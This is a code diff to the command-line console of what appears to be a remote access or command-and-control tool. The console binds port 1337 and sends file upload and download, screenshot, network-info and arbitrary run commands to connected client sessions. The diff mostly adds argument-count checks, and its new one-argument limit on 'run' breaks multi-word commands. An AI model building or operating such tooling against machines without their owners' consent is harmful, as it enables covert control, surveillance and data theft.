@@ -18,16 +18,16 @@ class CommandLineInterface:
 
     Attributes:
         currentSession (int): Number of the current session the user is managing.
-        specified_port (int): Optional argument to indicate the port to bind. By default 1337.
+        specifiedPort (int): Optional argument to indicate the port to bind. By default 1337.
     """
 
-    def __init__(self, specified_port=1337, currentSession=None):
+    def __init__(self, specifiedPort=1337, currentSession=None):
         self._currentSession = currentSession
-        self.specified_port = specified_port
+        self._specifiedPort = specifiedPort
 
     def start(self):
         """Starts the command-line interface logic"""
-        self.server = Server.getInstance("0.0.0.0", self.specified_port)
+        self.server = Server.getInstance("0.0.0.0", self._specifiedPort)
         self.server.start()
         self.commandHandler()
         init() # Colorama
@@ -57,43 +57,52 @@ class CommandLineInterface:
 
             if user_input.startswith('upload_file'):
                 args = user_input.split()[1:]
-                local_file = args[0]
-                remote_file = args[1]
-                connection = self.server.getConnection(self._currentSession - 1)
 
-                mod = UploadFile(connection, local_file, remote_file)
-                stdout = mod.execute()
+                if len(args) == 2:
+                    local_file = args[0]
+                    remote_file = args[1]
+                    connection = self.server.getConnection(self._currentSession - 1)
 
-                print(stdout)
+                    mod = UploadFile(connection, local_file, remote_file)
+                    stdout = mod.execute()
+
+                    print(stdout)
+                else:
+                    print("Invalid number of arguments")
 
             if user_input.startswith('download_file'):
                 args = user_input.split()[1:]
 
-                remote_file = args[0]
-                local_file = args[1]
-                connection = self.server.getConnection(self._currentSession - 1)
+                if len(args) == 2:
+                    remote_file = args[0]
+                    local_file = args[1]
+                    connection = self.server.getConnection(self._currentSession - 1)
 
-                mod = DownloadFile(connection, remote_file, local_file)
-                stdout = mod.execute()
+                    mod = DownloadFile(connection, remote_file, local_file)
+                    stdout = mod.execute()
 
-                print(stdout)
+                    print(stdout)
+                else:
+                    print("Invalid number of arguments")
 
 
             if user_input.startswith('screenshot'):
                 args = user_input.split()[1:]
 
-                local_path = args[0]
-                connection = self.server.getConnection(self._currentSession - 1)
+                if len(args) == 1:
+                    local_path = args[0]
+                    connection = self.server.getConnection(self._currentSession - 1)
 
-                mod = Screenshot(connection, local_path)
-                stdout = mod.execute()
+                    mod = Screenshot(connection, local_path)
+                    stdout = mod.execute()
 
-                print(stdout)
+                    print(stdout)
+                else:
+                    print("Invalid number of arguments")
 
             if user_input == 'netinfo':
                 connection = self.server.getConnection(self._currentSession - 1)
                 client_os = self.server.getClient(self._currentSession - 1).getClientInfo()[4]
-
 
                 mod = NetInfo(connection, client_os)
                 stdout = mod.execute()
@@ -103,12 +112,15 @@ class CommandLineInterface:
             if user_input.startswith('run'):
                 args = user_input.split()[1:]
 
-                connection = self.server.getConnection(self._currentSession - 1)
-                command = ' '.join(args)
+                if len(args) == 1:
+                    connection = self.server.getConnection(self._currentSession - 1)
+                    command = ' '.join(args)
 
-                stdout = Run(connection, command).execute()
+                    stdout = Run(connection, command).execute()
 
-                print(stdout)
+                    print(stdout)
+                else:
+                    print("Invalid number of arguments")
 
             if user_input == 'back':
                 self._currentSession = None
